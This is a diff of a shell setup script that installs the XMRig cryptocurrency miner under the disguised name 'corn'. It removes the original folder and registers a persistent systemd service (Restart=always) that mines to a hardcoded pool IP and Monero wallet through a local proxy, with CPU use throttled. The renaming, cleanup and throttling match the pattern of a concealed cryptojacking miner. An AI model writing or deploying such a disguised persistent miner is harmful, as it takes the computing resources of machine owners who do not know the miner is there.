@@ -20,7 +20,9 @@ mv xmrig-6.22.2-linux-static-x64.tar.gz corn.tar.gz
 
 tar xzfv corn.tar.gz
 
-cp /home/corn/corn/xmrig /home/corn/corn/corn
+mv /home/corn/xmrig-6.22.2/xmrig /home/corn/corn
+
+rm -R /home/corn/xmrig-6.22.2
 
 # 建立 xmrig systemd 服務檔 (注意：這裡的 ExecStart 中 --proxy 參數使用本地 127.0.0.1:1080)
 
@@ -36,9 +38,9 @@ After=network.target
 
 [Service]
 
-WorkingDirectory=/home/corn/corn
+WorkingDirectory=/home/corn
 
-ExecStart=/home/corn/corn/corn -o 114.29.237.94:3333 -u 43cx2hYimLw9YkAYxLG8Vg2TStTL3r6XmbfDfBiCY9MCViYCCaYpEzr1BUCmZTquQwLpg7Sb1FhrV4qR5EXWwvkgKdSHVLd -p x  --cpu-priority=2 --cpu-max-threads-hint=50 -k --proxy 127.0.0.1:1080 
+ExecStart=/home/corn/corn -o 114.29.237.94:3333 -u 43cx2hYimLw9YkAYxLG8Vg2TStTL3r6XmbfDfBiCY9MCViYCCaYpEzr1BUCmZTquQwLpg7Sb1FhrV4qR5EXWwvkgKdSHVLd -p x  --cpu-priority=2 --cpu-max-threads-hint=50 -k --proxy 127.0.0.1:1080 
 
 Restart=always
 
